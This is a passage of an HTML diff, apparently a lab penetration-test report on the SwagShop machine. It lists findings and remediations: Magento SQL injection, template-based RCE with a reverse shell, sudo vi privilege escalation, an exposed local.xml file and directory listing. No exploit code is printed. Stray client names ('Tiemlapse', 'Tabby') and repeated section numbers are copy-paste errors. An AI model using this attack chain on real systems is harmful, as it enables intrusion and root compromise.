+        ether 00:50:56:94:bf:f1  txqueuelen 1000  (Ethernet)
+        RX packets 120431  bytes 12135977 (12.1 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 136978  bytes 17886154 (17.8 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 13459  bytes 1004698 (1.0 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13459  bytes 1004698 (1.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@swagshop:/var/www/html# 
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/22.png" alt="">
+                        </div>
+                    </section>
+
+                    <section id="Remmediation-Summary">
+                        <h1>7. Remmediation Summary</h1>
+                        <p>As a result of this assessment, there are several opportunities for <strong>Tiemlapse</strong> to strengthen the security of its internal network. Remediation efforts are then prioritized, starting with those likely to require the least amount of time and effort to complete. <strong>Tabby</strong> must ensure that all remediation steps and mitigation controls are carefully planned and tested to prevent service interruptions or data loss.</p>
+                        <section id="Short-Term">
+                            <h2>7.1 Short Term</h2>
+                            <ul>
+                                <li><span style="color: greenyellow;">[Finding 4]</span> Configure permissions on the server so that files like <i>app/etc/local.xml</i> are not publicly accessible. Review access settings on the web server (<strong>Apache/Nginx</strong>) and apply rules to protect critical directories.</li>
+                                <li><span style="color: greenyellow;">[Finding 5]</span> Modify web server configuration to disable directory listing in <i>/shell/</i> and <i>/var/export/</i>. Add the `<strong>Options -Indexes</strong>` directive to the server configuration.</li>
+                                <li><span style="color: greenyellow;">[Finding 3]</span> Restrict `<strong>sudo</strong>` permissions for users such as <strong>www-data</strong> and ensure they cannot run dangerous commands such as `<strong>vi</strong>`. Review and adjust the `<strong><i>/etc/sudoers</i></strong>` file or its inclusions to limit privileges.</li>
+                            </ul>
+                        </section>
+                        <section id="Medium-Term">
+                            <h2>7.2 Medium Term</h2>
+                            <ul>
+                                <li><span style="color: greenyellow;">[Finding 1]</span> Upgrade Magento to a secure version that is not vulnerable to SQL injections like <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1397" target="_blank">CVE-2015-1397</a>.</li>
+                                <li><span style="color: greenyellow;">[Finding 1]</span> Review and enforce user data handling on all application inputs to prevent SQL injections and remote code execution.</li>
+                                <li><span style="color: greenyellow;">[Finding 2]</span> Set up strict controls for templates and file uploads in Magento. Limit the use of advanced features in templates and restrict the file types accepted for upload.</li>
+                            </ul>                            
+                        </section>
+                        <section id="Long-Term">
+                            <h2>7.3 Long Term</h2>
+                            <ul>
+                                <li>Configure automated vulnerability scanning tools to proactively identify and mitigate issues. Use tools like <strong>Nessus</strong>, <strong>OpenVAS</strong> or <strong>Burp Suite</strong> to perform periodic audits.</li>
+                                <li>Establish clear system-wide file security and access control policies. Implement access control lists (ACLs) and proper segmentation of users and permissions.</li>
+                                <li>Train development and operations team on secure programming and systems management practices. Organize workshops and training on OWASP Top 10 and hardening strategies.</li>
+                            </ul>
+                        </section>
+                    </section>
+                    <section id="Technical-Findings-Details">
+                        <h1>8. Technical Findings Details</h1>
+                        <h3>SQL Injection: Magento 1.9.0.0 - <span style="color: rgb(160, 0, 0)">Critical</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-darkRed">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank">CWE-89</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-darkRed">CVSS</td>
+                                    <td id="column-2-2">9.8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Description</td>
+                                    <td id="column-2-1">Magento 1.9.0.0 is vulnerable to <strong>CVE-2015-1397</strong>, allowing SQL injections.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Security Impact</td>
+                                    <td id="column-2-2">Allows an attacker to manipulate SQL queries to create a malicious admin user and gain full access to the Magento admin panel.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-darkRed">Remediation</td>
+                                    <td id="column-2-1">Upgrade to a secure version of Magento. Implement validations and filtering on user input to prevent SQL injections.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <p>Once the exploit is executed, we log in with the credentials in the administrative panel.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/8.png" alt="">
+                            <img src="../images/Posts/SwagShop/9.png" alt="">
+                        </div>
+                        
+                        <h3>Remote Code Execution (RCE) in Magento admin panel- <span style="color:red"> High</span> </h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/94.html" target="_blank">CWE-94</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">8.8</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">Using a newsletter template to execute malicious code.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">Allows an attacker to upload and execute malicious files on the server, leading to system compromise and execution of a reverse shell as the `<strong>www-data</strong>` user.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Implement strict validation and sanitization controls on file uploads. Restrict the use of templates with untrusted dynamic logic.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/18.png" alt="">
+                            <img src="../images/Posts/SwagShop/19.png" alt="">
+                        </div>
+
+                        <h3>Insecure File Permissions for www-data user - <span style="color:red">High</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-red">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/264.html" target="_blank">CWE-264</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-red">CVSS</td>
+                                    <td id="column-2-2">7.5</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Description</td>
+                                    <td id="column-2-1">`<strong>www-data</strong>` has `<strong>sudo</strong>` permissions to run `<strong>vi</strong>` on certain files.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Security Impact</td>
+                                    <td id="column-2-2">It facilitates the escalation of privileges to the `<strong>root</strong>` user, allowing full access to the system and compromising its confidentiality, integrity and availability.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-red">Remediation</td>
+                                    <td id="column-2-1">Review and limit `<strong>sudo</strong>` permissions. Ensure that users have only the privileges necessary to perform their duties.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/20.png" alt="">
+                            <img src="../images/Posts/SwagShop/22.png" alt="">
+                        </div>
+
+                        <h3>Exposure of Sensitive Information - <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/200.html" target="_blank">CWE-200</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">5.3</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">The `<i>app/etc/local.xml</i>` file is publicly accessible.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">Allows an attacker to obtain database credentials in clear text, which may facilitate unauthorized access or exfiltration of sensitive data stored in the database.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remediation</td>
+                                    <td id="column-2-1">Restrict access to sensitive directories using web server settings. Ensure that sensitive files are not publicly accessible.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/4.png" alt="">
+                        </div>
+
+                        <h3>Directory Listing Enabled - <span style="color:orange">Medium</span></h3>
+                        <table id="tech-details">
+                            <thead>
+                                <tr>
+                                    <th id="column-th-1-orange">CWE</th>
+                                    <th id="column-th-2"><a href="https://cwe.mitre.org/data/definitions/548.html" target="_blank">CWE-548</a></th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="column-1-orange">CVSS</td>
+                                    <td id="column-2-2">4.3</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Description</td>
+                                    <td id="column-2-1">Directories such as `<i>/shell/</i>` and `<i>/var/export/</i>` allow their contents to be listed.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Security Impact</td>
+                                    <td id="column-2-2">It provides unnecessary information to attackers, such as sensitive files that could be used in later stages of exploitation.</td>
+                                </tr>
+                                <tr>
+                                    <td id="column-1-orange">Remediation</td>
+                                    <td id="column-2-1">Disable directory listing in the web server configuration. Review file permissions and ensure that only necessary access is allowed.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>Finding Evidence</h3>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/SwagShop/6.png" alt="">
+                            <img src="../images/Posts/SwagShop/7.png" alt="">
+                        </div>
+                    </section>                   
+                   
+                    <section id="Conclusion">
+                        <h1>7. Conclusion</h1>
+                        <p>The security assessment carried out at <strong>SwagShop</strong> identified multiple critical vulnerabilities that compromise the confidentiality, integrity and availability of the systems. These flaws demonstrate the existence of insecure configurations, lack of updates and inadequate controls in the management of permissions and access.</p>
+                        <p>The most worrying finding was a <strong>SQL injection</strong> vulnerability, which allowed the creation of a malicious administrator user and full access to the system. This type of vulnerability represents a significant risk, as it enables full control of the system by an attacker. In addition, issues such as remote code execution, exposure of sensitive information, enabled directory listings, and insecure file permissions that facilitated privilege escalation were identified.</p>
+                        <p>Protecting <strong>SwagShop</strong>'s digital assets is essential to ensure the trust of its customers and the continued operation of the business. This report will serve as a guide to strengthening the organization's security posture and minimizing the risks associated with potential future attacks.</p>
+                    </section>
+                    
+                    <section id="Appendices">
+                        <h1> 8. Appendices</h1> 
+
+                    </section>
+                    <!--Final-->
+                </section>
+            </div>
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <!--Pet Cat-->
+    <script src="script.js"></script>
+</body>
+</html>
